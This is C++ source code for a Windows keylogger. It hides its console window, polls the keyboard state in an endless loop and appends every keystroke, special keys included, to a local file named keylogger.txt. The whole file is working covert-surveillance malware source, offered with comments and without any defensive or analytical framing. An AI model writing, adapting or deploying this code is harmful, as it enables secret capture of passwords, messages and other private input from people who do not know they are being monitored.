#include <iostream>
#include <fstream>
#include <Windows.h>

//Log file
#define LOG_FILE "keylogger.txt"

void SaveData(std::string data)
{
	std::fstream logFile;

	//Open file
	logFile.open(LOG_FILE, std::ios::app);

	//Write data
	logFile << data;

	//Close file
	logFile.close();
}

std::string translateSpecialKey(int key)
{
	std::string result;

	switch (key)
	{
	case VK_SPACE:
		//Space key
		result = " ";
		break;
	case VK_RETURN:
		//Enter key
		result = "\n";
		break;
	case VK_BACK:
		//Backspace key
		result = "\b";
		break;
	case VK_CAPITAL:
		//Capslock key
		result = "[CAPS LOCK]";
		break;
	case VK_SHIFT:
		//Shift key
		result = "[SHIFT]";
		break;
	case VK_TAB:
		//Tab key
		result = "[TAB]";
		break;
	case VK_CONTROL:
		//Control key
		result = "[CTRL]";
		break;
	case VK_MENU:
		//Alt key
		result = "[ALT]";
		break;
	default:
		break;
	}

	return result;
}

int main()
{
	int SpecialKeyArray[] = { VK_SPACE, VK_RETURN, VK_BACK, VK_CAPITAL, VK_SHIFT, VK_TAB, VK_CONTROL, VK_MENU };
	std::string  SpecialKeyChar;
	bool isSpecialKey;

	//Hide terminal window
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);

	//Loop forever
	while (true)
	{
		//Loop through each key
		for (auto key = 0; key < 190; key++)
		{
			// Check key is pressed
			if (GetAsyncKeyState(key) == -32767)
			{
				//Key is pressed 
				//Check if key is special key
				isSpecialKey = std::find(std::begin(SpecialKeyArray), std::end(SpecialKeyArray), key) != std::end(SpecialKeyArray);
				if (isSpecialKey)
				{
					//Translate special keys
					SpecialKeyChar = translateSpecialKey(key);
					//Save data
					SaveData(SpecialKeyChar);
				}
				else
				{
					//This is not a special key
					//Check uppercase or lowercase
					if (GetKeyState(VK_CAPITAL))
					{
						//CAPS is on
						SaveData(std::string(1, (char) key));
					}
					else
					{
						//CAPS is off
						//Turn the character into lowercase before save
						SaveData(std::string(1, (char)std::tolower(key)));
					}
				}
			}
		}
	}
	return 0;
}
